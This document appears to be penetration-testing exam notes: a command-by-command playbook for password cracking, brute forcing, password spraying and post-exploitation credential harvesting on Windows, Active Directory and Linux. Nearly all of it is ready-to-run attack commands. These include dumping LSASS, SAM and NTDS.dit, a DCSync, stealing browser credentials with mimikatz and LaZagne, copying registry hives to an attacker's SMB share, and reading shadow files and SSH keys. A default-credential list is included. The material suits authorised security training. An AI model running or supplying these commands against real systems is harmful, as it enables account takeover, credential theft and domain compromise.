# PHASE 5: PASSWORD ATTACKS

> **Flow note:** This phase is NUMBERED 5 but RUNS IN PARALLEL with Phase 7/8/9 once hashes obtained.
> Linear path: foothold (3+6) → cred harvest (7) → crack here (5) → privesc (8) → AD (9).
> Online attacks (spraying, brute force) can ALSO run during Phase 1/4 if you have a userlist + no hashes yet.
> Three trigger points to enter Phase 5:
>   1. After Phase 7 dumps SAM/LSASS/shadow → crack offline
>   2. After Phase 9.1.1 Responder → crack NetNTLMv2
>   3. After Phase 9.4 Kerberoast / 9.1.7 AS-REP roast → crack TGS/AS-REP

---

## 5.1 - Hash Identification
```bash
hashid '<hash>'
hashid -j '<hash>'  # JtR format
hashid -m '<hash>'  # Hashcat mode
```

**Common Hash Formats (memorize modes — exam-frequent):**
| Type | Format/Length | Hashcat Mode | JtR Format |
|------|--------|-------------|------------|
| MD5 | 32 hex | 0 | raw-md5 |
| SHA1 | 40 hex | 100 | raw-sha1 |
| SHA256 | 64 hex | 1400 | raw-sha256 |
| SHA512 | 128 hex | 1700 | raw-sha512 |
| NTLM | 32 hex | 1000 | nt |
| NetNTLMv1 | user::DOMAIN:... | 5500 | netntlm |
| NetNTLMv2 (Responder) | user::DOMAIN:...:... | 5600 | netntlmv2 |
| LM | 32 hex | 3000 | lm |
| Kerberos AS-REP | $krb5asrep$23$ | 18200 | krb5asrep |
| Kerberos TGS-REP RC4 | $krb5tgs$23$ | 13100 | krb5tgs |
| Kerberos TGS-REP AES256 | $krb5tgs$18$ | 19700 | krb5tgs-aes256 |
| Kerberos TGS-REP AES128 | $krb5tgs$17$ | 19600 | krb5tgs-aes128 |
| Kerberos PreAuth RC4 | $krb5pa$23$ | 7500 | krb5pa-md5 |
| DCC (MSCash) | $DCC$ | 1100 | mscash |
| DCC2 (MSCash2) | $DCC2$ | 2100 | mscash2 |
| bcrypt | $2*$ | 3200 | bcrypt |
| BitLocker | $bitlocker$0$ | 22100 | bitlocker |
| KeePass | $keepass$ | 13400 | keepass |
| ZIP (PKZIP) | $pkzip$ | 17200 | pkzip |
| RAR3 | $RAR3$ | 12500 | rar |
| RAR5 | $rar5$ | 13000 | rar5 |
| 7-Zip | $7z$ | 11600 | 7z |
| Office 2013+ | $office$ | 9600 | office2013 |
| PDF 1.4-1.6 | $pdf$ | 10500 | pdf |
| SSH (RSA/DSA) | $sshng$ | 22921 | ssh |
| MD5(Wordpress) | $P$ | 400 | phpass |
| SHA512crypt ($6$) | $6$salt$hash | 1800 | sha512crypt |
| SHA256crypt ($5$) | $5$salt$hash | 7400 | sha256crypt |
| MD5crypt ($1$) | $1$salt$hash | 500 | md5crypt |
| yescrypt ($y$) | $y$j9T$salt$hash | (no native) | use john |
| JWT (HMAC) | header.payload.sig | 16500 | HMAC-SHA256 |

**Linux Shadow Hash Identification:**
```
$1$ = MD5
$5$ = SHA-256
$6$ = SHA-512
$y$ = yescrypt (modern default)
$2a$/$2b$ = bcrypt
```

**Windows Hash Sources (see Phase 7 for extraction):**
```
SAM → Local account NT hashes
LSASS → Cached domain creds, Kerberos tickets
NTDS.dit → All domain account hashes (DCSync)
LSA Secrets → Service account passwords
DPAPI → Browser creds, RDP saved creds
```

## 5.2 - Offline Cracking

### John the Ripper
```bash
# Wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hashes.txt

# Single crack (GECOS-based - uses username/fullname info to generate candidates)
john --single hashes.txt
# Best for Linux /etc/shadow - generates variations from username fields

# Incremental mode (Markov chains - brute force with character frequency)
john --incremental hashes.txt

# Specify format
john --format=raw-md5 hashes.txt
john --format=nt hashes.txt

# Show results
john hashes.txt --show
```

### Hashcat
```bash
# Dictionary
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt  # MD5
hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt  # NTLM

# With rules
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack
hashcat -a 3 -m 0 hash.txt '?u?l?l?l?l?d?s'  # Ullllds
hashcat -a 3 -m 0 hash.txt -1 '?l?u' '?1?1?1?1?d?s'

# Generate custom wordlist
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

### File Cracking
```bash
# SSH keys
ssh2john.py id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash

# ZIP
zip2john file.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

# RAR
rar2john file.rar > rar.hash
john --wordlist=/usr/share/wordlists/rockyou.txt rar.hash

# Office
office2john.py document.docx > office.hash
john --wordlist=/usr/share/wordlists/rockyou.txt office.hash

# PDF
pdf2john.py document.pdf > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash

# BitLocker
bitlocker2john -i backup.vhd > bitlocker.hashes
grep "bitlocker\$0" bitlocker.hashes > bitlocker.hash
hashcat -a 0 -m 22100 bitlocker.hash /usr/share/wordlists/rockyou.txt

# KeePass
keepass2john database.kdbx > keepass.hash

# OpenSSL encrypted
for i in $(cat rockyou.txt); do openssl enc -aes-256-cbc -d -in file.enc -k $i 2>/dev/null; done
```

### Custom Wordlists
```bash
# CeWL - spider website for words
cewl https://www.target.com -d 4 -m 6 --lowercase -w target.wordlist

# Username Anarchy
./username-anarchy -i names.txt

# Filter by password policy
grep -E '^.{8,}$' wordlist.txt > min8.txt
grep -E '[A-Z]' min8.txt > has_upper.txt
grep -E '[a-z]' has_upper.txt > has_lower.txt
grep -E '[0-9]' has_lower.txt > has_number.txt

# CUPP - Personalized password profiling
cupp -i    # Interactive mode: name, DOB, pet, company, etc.

# Username Anarchy - Generate all username permutations
./username-anarchy -i names.txt    # Jane Smith → jsmith, jane.smith, j.smith, etc.

# Password policy analysis before brute forcing
netexec smb DC -u user -p pass --pass-pol        # Check lockout policy
rpcclient -U "" -N DC → getdompwinfo              # NULL session
ldapsearch -h DC -x -b "DC=domain,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

## 5.3 - Online Attacks

### Hydra
```bash
# HTTP Basic Auth
hydra -l admin -P passwords.txt <target> http-get / -s 81

# HTTP POST Form
hydra -l admin -P passwords.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
hydra -l admin -P passwords.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

# SSH
hydra -L users.txt -P passwords.txt ssh://<target>

# FTP
hydra -L users.txt -P passwords.txt ftp://<target>

# SMB
hydra -L users.txt -P passwords.txt smb://<target>

# RDP
hydra -l administrator -P passwords.txt rdp://<target>

# Credential stuffing (user:pass file)
hydra -C user_pass.list ssh://<target>

# Brute-force generation (-x flag)
hydra -l admin -x 6:8:aA1 rdp://<target>    # Length 6-8, lowercase+uppercase+digits

# Multiple targets
hydra -l root -p toor -M targets.txt ssh

# Stop on first valid
hydra -l admin -P passwords.txt -f ssh://<target>
```

### Medusa
```bash
medusa -h <target> -u root -P passwords.txt -M ssh -t 3
medusa -h <target> -u fiona -P /usr/share/wordlists/rockyou.txt -M ftp
medusa -h <target> -U usernames.txt -e ns -M ssh  # Check empty/same-as-user
```

### NetExec
```bash
netexec smb <target> -u users.txt -p passwords.txt
netexec winrm <target> -u users.txt -p passwords.txt
netexec mssql <target> -u users.txt -p passwords.txt
```

## 5.4 - Password Spraying
```
Decision: Account lockout policy?
├── Strict → Spray: 1 password, many users
├── Lenient → Brute force with wordlist
├── Unknown → Start spraying, monitor for lockouts
└── No policy → Full brute force
```

```bash
# NetExec spraying
netexec smb <target_range> -u users.txt -p 'Password123!'
netexec smb <target_range> -u users.txt -p 'Welcome1'
netexec smb <target_range> -u users.txt -p 'Summer2024!'

# Kerbrute spraying
kerbrute passwordspray --dc <dc_ip> --domain <domain> users.txt 'Password123!'
```

## 5.5 - Network Credential Capture

```bash
# Wireshark filters for credential capture
# http contains "passw"           # HTTP with password
# http.request.method == "POST"   # POST requests (login forms)
# ftp.request.command == "PASS"   # FTP passwords
# smtp.auth.username              # SMTP auth

# PCredz (extract creds from pcap)
python3 PCredz.py -r capture.pcap
# Extracts: NTLMv1/v2, Kerberos, FTP, HTTP Basic, SMTP

# tcpdump capture (run on compromised host)
tcpdump -i eth0 -w capture.pcap port not 22
```

## 5.6 - Network Share Credential Hunting

```bash
# Snaffler (Windows - finds creds in shares)
.\Snaffler.exe -o snaffler.log

# NetExec share spider
netexec smb <dc_ip> -u <user> -p '<pass>' -M spider_plus --share 'Department Shares'

# MANSPIDER (Linux - search share contents)
manspider.py <dc_ip> -u <user> -p '<pass>' -m password,cred,secret

# Manual share search
find /mnt/share -name "*cred*" -o -name "*password*" -o -name "*config*" 2>/dev/null
grep -rn "password" /mnt/share/ 2>/dev/null
```

## 5.7 - Default Credentials
```bash
# Tool
pip3 install defaultcreds-cheat-sheet
creds search <product>

# Always try
admin:admin, admin:password, admin:(empty)
root:root, root:toor, root:(empty)
tomcat:tomcat, tomcat:s3cret
jenkins:jenkins
splunk:splunk
prtgadmin:prtg
sa:(empty), sa:sa
```

---

# PHASE 7: POST-EXPLOITATION - CREDENTIAL HARVESTING

## 7.1 - Windows Credential Sources
```
Decision: What access do we have?
├── Local Admin → Dump SAM, LSASS, LSA secrets
├── Domain User → Check Credential Manager, saved creds
├── SYSTEM → Full access to all credential stores
└── Domain Admin → DCSync, NTDS.dit extraction
```

### SAM Database (Local Accounts)
```bash
# Local dump (admin access)
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Transfer via SMB share
sudo smbserver.py -smb2support CompData /tmp/
move sam.save \\<attacker>\CompData

# Offline dump
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Remote dump
netexec smb <target> --local-auth -u <admin> -p '<pass>' --sam
netexec smb <target> --local-auth -u <admin> -p '<pass>' --lsa

# Crack NT hashes
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

### LSASS Memory
```bash
# Find PID
tasklist /svc | findstr lsass
Get-Process lsass

# Dump (command line)
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full

# Dump (GUI) → Task Manager → lsass → Create dump file

# Extract credentials
pypykatz lsa minidump /path/to/lsass.dmp

# What we get:
# MSV: NT hashes, SHA1 hashes
# WDIGEST: Cleartext passwords (older Windows)
# Kerberos: Tickets, ekeys
# DPAPI: Master keys
```

### Credential Manager
```bash
cmdkey /list
# Saved creds → use with runas /savecred
runas /savecred /user:<domain>\<user> cmd.exe
```

### DPAPI (Chrome, Outlook, RDP saved creds)
```bash
# Chrome
mimikatz # dpapi::chrome /in:"C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

# Firefox (manual)
# C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>\logins.json + key4.db
# Use firefox_decrypt.py or LaZagne

# Edge
# C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\Default\Login Data

# RDP saved creds
# C:\Users\<user>\AppData\Local\Microsoft\Credentials\

# Automated (all browsers)
.\LaZagne.exe all
```

### Autologon / Winlogon Registry
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword DefaultDomainName"
```

### GPP / cPasswords in SYSVOL
```bash
# Find cpassword in Group Policy XML files
findstr /S /I cpassword \\<dc>\sysvol\<domain>\policies\*.xml

# Decrypt
gpp-decrypt <cpassword_hash>
# Decrypts to plaintext local admin password

# Linux
smb //<dc>/sysvol -U <user> -c "recurse;prompt OFF;mget *"
grep -rn cpassword /path/to/sysvol/
```

### Unattend.xml / Sysprep Credentials
```bash
# Check these paths (contain base64-encoded admin passwords)
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\Unattend.xml
C:\Windows\System32\Sysprep\sysprep.xml

# Extract and decode
type C:\Windows\Panther\Unattend.xml | findstr /i "password"
# Decode base64 → plaintext password
```

### WiFi Password Extraction
```powershell
netsh wlan show profiles                    # List saved networks
netsh wlan show profile name="<SSID>" key=clear  # Show password
```

### Token Impersonation / Incognito
```powershell
# In Meterpreter
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"

# In Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords  # Extract all logon creds
```

### NTDS.dit (Domain Accounts)
```bash
# Connect to DC
evil-winrm -i <dc_ip> -u <domain_admin> -p '<pass>'

# Check privileges
net localgroup
net user <username>

# Volume Shadow Copy
vssadmin CREATE SHADOW /For=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit.save
reg.exe save hklm\system C:\system.save

# Offline dump
secretsdump.py -ntds ntds.dit.save -system system.save LOCAL

# Remote DCSync
secretsdump.py <domain>/<user>:<password>@<dc_ip>
secretsdump.py <domain>/<user>:<password>@<dc_ip> --just-dc-ntlm
```

## 7.2 - Linux Credential Sources
```bash
cat /etc/shadow
cat /etc/passwd
cat /etc/shadow 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

# History
cat ~/.bash_history
cat /home/*/.bash_history

# Config files
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.xml" -exec grep -l "password" {} \; 2>/dev/null

# MySQL
cat ~/.mysql_history
cat /etc/mysql/debian.cnf

# Environment
env
cat /etc/environment
```

## 7.3 - Sensitive File Hunting
```bash
# Windows - CMD
dir /s /b C:\*cred* C:\*secret* C:\*password* C:\*config*
findstr /s /i "password" C:\*.txt C:\*.xml C:\*.ini
dir n:\*cred* /s /b                    # Search network share
findstr /s /i cred n:\*.*             # Search file contents on share

# Windows - PowerShell
Get-ChildItem -Recurse -Path C:\ -Include *cred*,*secret*,*password* -File -ErrorAction SilentlyContinue
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
Get-ChildItem -Recurse -Path N:\ | Select-String "password" -List

# Linux
find / -name "*cred*" -o -name "*secret*" -o -name "*password*" 2>/dev/null
grep -rn "password" /etc/ 2>/dev/null
grep -rn "password" /opt/ 2>/dev/null
grep -rn "password" /var/ 2>/dev/null
grep -rn "password" /var/www/ 2>/dev/null
```

---